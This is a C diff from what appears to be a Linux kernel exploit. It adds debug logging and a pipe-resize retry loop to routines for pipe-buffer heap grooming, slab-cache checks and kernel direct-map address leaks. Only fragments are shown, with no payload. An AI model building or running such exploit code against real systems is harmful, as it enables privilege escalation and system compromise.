@@ -89,7 +89,7 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
 }
 
 void resize_pipe_slots(int pipefd[2], size_t slots) {
-  SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+  int result = fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE); if (result < 0) { pr_error("F_SETPIPE_SZ failed: slots=%zu size=%zu errno=%d", slots, slots * PAGE_SIZE, errno); for (size_t test_slots = slots; test_slots > 0; test_slots--) { result = fcntl(pipefd[0], F_SETPIPE_SZ, test_slots * PAGE_SIZE); if (result >= 0) { pr_success("F_SETPIPE_SZ succeeded with slots=%zu size=%zu", test_slots, test_slots * PAGE_SIZE); break; } } }
 }
 
 void make_pipe_object(int pipefd[2]) {
@@ -394,7 +394,9 @@ int pipe_cache_matches(uint64_t slab_cache) {
 }
 
 int pipe_reclaim_cache_gate(int fd) {
+  pr_info("pipebuf_page_base=%016zx DIRECT_MAP_BASE=%016zx DIRECT_MAP_END=%016zx\n", pipebuf_page_base, DIRECT_MAP_BASE, DIRECT_MAP_END);
   if (!is_direct_ptr(pipebuf_page_base)) {
+    pr_error("pipebuf_page_base %016zx not in direct map\n", pipebuf_page_base);
     return 0;
   }
 
@@ -1043,8 +1045,10 @@ int prepare_p0_pipe_oracle(void) {
   }
   p0_gate_holders_initialized = 1;
 
-  pipebuf_page_base = prepare_pipe_buffer_page();
+pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("pipebuf_page_base=%016zx DIRECT_MAP_BASE=%016zx DIRECT_MAP_END=%016zx\n", pipebuf_page_base, DIRECT_MAP_BASE, DIRECT_MAP_END);
   if (!is_direct_ptr(pipebuf_page_base)) {
+    pr_error("pipebuf_page_base %016zx not in direct map\n", pipebuf_page_base);
     return 0;
   }
 
